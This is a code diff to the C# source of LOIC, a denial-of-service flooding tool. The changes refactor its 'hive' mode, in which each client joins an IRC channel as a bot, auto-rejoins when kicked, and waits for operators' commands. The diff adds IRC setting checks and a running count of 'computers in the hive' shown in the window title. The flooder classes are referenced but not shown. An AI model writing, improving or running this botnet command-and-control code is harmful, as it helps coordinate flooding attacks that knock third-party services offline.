@@ -18,12 +18,13 @@ namespace LOIC
 		private static XXPFlooder[] xxp;
 		private static HTTPFlooder[] http;
 		private static string sHost, sIP, sMethod, sData, sSubsite;
-		private static int iPort, iThreads, iProtocol, iDelay, iTimeout;
+        private static int iPort, iThreads, iProtocol, iDelay, iTimeout, iIRCPort, iHiveSize;
 		private static bool bResp, intShowStats;
 		private IrcClient irc;
 		private Thread irclisten;
 		private string channel;
 		private static bool ircenabled = false;
+        private static bool ircClientInitialized = false;
 		private Dictionary<string, string> OpList;
 		private delegate void CheckParamsDelegate(List<string> pars);
 		public frmMain(bool hive, bool hide, string ircserver, string ircport, string ircchannel)
@@ -174,22 +175,25 @@ namespace LOIC
         }
         private void DoHive(bool enabled)
         {
-            try
+            if (enabled)
             {
+                //Adds methods to their event handler plus other small things that only need to be done once.
+                if (!ircClientInitialized)
+                {
+                    InitailizeIrcClient();
+                }
+
                 //Is everything ok?
-                if ((txtIRCserver.Text == "" || txtIRCchannel.Text == "") && enabled)
+                try
                 {
-                    disableHive.Checked = true;
+                    ValidateIRCParameters();  //Throws custom ArgumentExceptions with custom messages
+                                              //that can be used in the message box that pops up.
                 }
-                else if (enabled)
-                {
-                    try { IPHostEntry ipHost = Dns.GetHostEntry(txtIRCserver.Text); }
-                    catch { disableHive.Checked = true; }
-                }
-                if (disableHive.Checked && enabled)
+                catch (ArgumentException exception)
                 {
                     new frmWtf().Show();
-                    MessageBox.Show("Did you filled IRC options correctly?", "What the shit.");
+                    MessageBox.Show(exception.Message, "What the shit.");
+                    disableHive.Checked = true;
                     return;
                 }
 
@@ -200,55 +204,28 @@ namespace LOIC
 
                 //Lets try this!
                 ircenabled = enabled;
-                if (enabled)
+                channel = txtIRCchannel.Text;
+                label25.Text = "Connecting..";
+                try
                 {
-                    label25.Text = "Connecting..";
-                    irc = new IrcClient();
-                    irc.OnConnected += IrcConnected;
-                    irc.OnReadLine += OnReadLine;
-                    irc.OnChannelMessage += OnMessage;
-                    irc.OnOp += OnOp;
-                    irc.OnDeop += OnDeOp;
-                    irc.OnPart += OnPart;
-                    irc.OnNickChange += OnNickChange;
-                    irc.OnTopic += OnTopic;
-                    irc.OnTopicChange += OnTopicChange;
-                    irc.OnQuit += OnQuit;
-                    irc.OnKick += OnKick;
-                    irc.OnDisconnected += IrcDisconnected;
-                    irc.OnNames += OnNames;
-                    irc.AutoRejoinOnKick = true;
-                    irc.AutoRejoin = true;
-                    try
-                    {
-                        int port;
-                        if (!int.TryParse(txtIRCport.Text, out port)) port = 6667;
-                        irc.Connect(txtIRCserver.Text, port);
-                        channel = txtIRCchannel.Text;
-                        // irc.WriteLine(Rfc2812.Nick("loicbot"),Priority.Critical);
-                        // irc.WriteLine(Rfc2812.User("loic", 0, "ACSLaw"),Priority.Critical);
-                        irc.Login("LOIC_" + new Functions().RandomString(), "Newfag's remote LOIC", 0, "IRCLOIC");
-
-                        //Spawn a fuckign thread to handle the listen.. why!?!?
-                        irclisten = new Thread(new ThreadStart(IrcListenThread));
-                        irclisten.Start();
-                    }
-                    catch
-                    { }
+                    IrcConnect();
+                    //Spawn a fuckign thread to handle the listen.. why!?!?
+                    irclisten = new Thread(new ThreadStart(IrcListenThread));
+                    irclisten.Start();
                 }
-                else
-                {
-                    try
-                    {
-                        if (irc != null) irc.Disconnect();
-                    }
-                    catch
-                    { }
-                    label25.Text = "Disconnected.";
-                }
+                catch
+                { }
             }
-            catch
-            { }
+            else
+            {
+                try
+                {
+                    if (irc != null) irc.Disconnect();
+                }
+                catch
+                { }
+                label25.Text = "Disconnected.";
+            }
         }
         private void IrcListenThread()
         {
@@ -257,19 +234,24 @@ namespace LOIC
                 irc.Listen();
             }
         }
+        private void IrcConnect()
+        {
+            iHiveSize = 0;
+            try
+            {
+                irc.Connect(txtIRCserver.Text, iIRCPort);
+                // irc.WriteLine(Rfc2812.Nick("loicbot"),Priority.Critical);
+                // irc.WriteLine(Rfc2812.User("loic", 0, "ACSLaw"),Priority.Critical);
+                irc.Login("LOIC_" + new Functions().RandomString(), "Newfag's remote LOIC", 0, "IRCLOIC");
+            }
+            catch
+            { }
+        }
         private void IrcDisconnected(object o, EventArgs e)
         {
             if (ircenabled)
             {
-                try
-                {
-                    int port;
-                    if (!int.TryParse(txtIRCport.Text, out port)) port = 6667;
-                    irc.Connect(txtIRCserver.Text, port);
-                    irc.Login("LOIC_" + new Functions().RandomString(), "Newfag's remote LOIC", 0, "IRCLOIC");
-                }
-                catch
-                { }
+                IrcConnect();
             }
         }
         private void IrcConnected(object o, EventArgs e)
@@ -291,6 +273,7 @@ namespace LOIC
 
             foreach (string user in e.UserList)
             {
+                incrementHiveSize();
                 if (user.StartsWith("@") || user.StartsWith("&") || user.StartsWith("~"))
                 {
                     
@@ -314,6 +297,10 @@ namespace LOIC
                 OpList.Remove(e.Whom);
             }
         }
+        void OnJoin(object sender, JoinEventArgs e)
+        {
+            if (!irc.IsMe(e.Who)) incrementHiveSize();
+        }
         void OnPart(object sender, PartEventArgs e)
         {
             if (OpList == null) OpList = new Dictionary<string, string>();
@@ -321,6 +308,7 @@ namespace LOIC
             {
                 OpList.Remove(e.Who);
             }
+            decrementHiveSize();
         }
         void OnQuit(object sender, QuitEventArgs e)
         {
@@ -329,6 +317,7 @@ namespace LOIC
             {
                 OpList.Remove(e.Who);
             }
+            decrementHiveSize();
         }
         void OnTopic(object sender, TopicEventArgs e)
         {
@@ -376,6 +365,7 @@ namespace LOIC
             {
                 OpList.Remove(e.Whom);
             }
+            decrementHiveSize();
         }
         private delegate void SetStatusDelegate(string status);
         void SetStatus(string status)
@@ -532,7 +522,7 @@ namespace LOIC
                 string server = e.Line.Split(' ')[2];
                 irc.WriteLine("PONG " + server, Priority.Critical);
             }
-            else if (command == "376") //end of motd
+            else if (command == "376") // end of motd
             {
                 if (OpList != null) OpList.Clear();
                 irc.RfcJoin(channel);
@@ -672,6 +662,75 @@ namespace LOIC
         {
             System.Diagnostics.Process.Start("http://github.com/NewEraCracker/LOIC");
         }
-
-	}
+        private void incrementHiveSize()
+        {
+            iHiveSize++;
+            SetWindowTitle("{0} | U dun goofed | v. {1} | Computers in the hive : " + iHiveSize);
+        }
+        private void decrementHiveSize()
+        {
+            iHiveSize--;
+            SetWindowTitle("{0} | U dun goofed | v. {1} | Computers in the hive : " + iHiveSize);
+        }
+        private delegate void SetWindowTitleDelegate(string windowTitle);
+        void SetWindowTitle(string windowTitle)
+        {
+            if (this.InvokeRequired)
+            {
+                this.Invoke(new SetWindowTitleDelegate(SetWindowTitle), windowTitle);
+            }
+            else
+            {
+                this.Text = String.Format(windowTitle, Application.ProductName, Application.ProductVersion);
+            }
+        }
+        private void ValidateIRCParameters()
+        {
+            if (txtIRCserver.Text == "")
+            {
+                throw new System.ArgumentException("Did you filled IRC options correctly? Going to join an empty server?");
+            }
+            try
+            {
+                IPHostEntry ipHost = Dns.GetHostEntry(txtIRCserver.Text);
+            }
+            catch
+            {
+                throw new System.ArgumentException("Did you filled IRC options correctly? This server address is worth jackshit.");
+            }
+            if (txtIRCchannel.Text == "")
+            {
+                throw new System.ArgumentException("Did you filled IRC options correctly? Enter a channel, DURR.");
+            }
+            else if (!txtIRCchannel.Text.Substring(0, 1).Contains("#"))
+            {
+                txtIRCchannel.Text = "#" + txtIRCchannel.Text;
+            }
+            if (!int.TryParse(txtIRCport.Text, out iIRCPort))
+            {
+                iIRCPort = 6667;
+            }
+        }
+        private void InitailizeIrcClient()
+        {
+            irc = new IrcClient();
+            irc.OnConnected += IrcConnected;
+            irc.OnReadLine += OnReadLine;
+            irc.OnChannelMessage += OnMessage;
+            irc.OnOp += OnOp;
+            irc.OnDeop += OnDeOp;
+            irc.OnPart += OnPart;
+            irc.OnJoin += OnJoin;
+            irc.OnNickChange += OnNickChange;
+            irc.OnTopic += OnTopic;
+            irc.OnTopicChange += OnTopicChange;
+            irc.OnQuit += OnQuit;
+            irc.OnKick += OnKick;
+            irc.OnDisconnected += IrcDisconnected;
+            irc.OnNames += OnNames;
+            irc.AutoRejoinOnKick = true;
+            irc.AutoRejoin = true;
+            ircClientInitialized = true;
+        }
+    }
 }
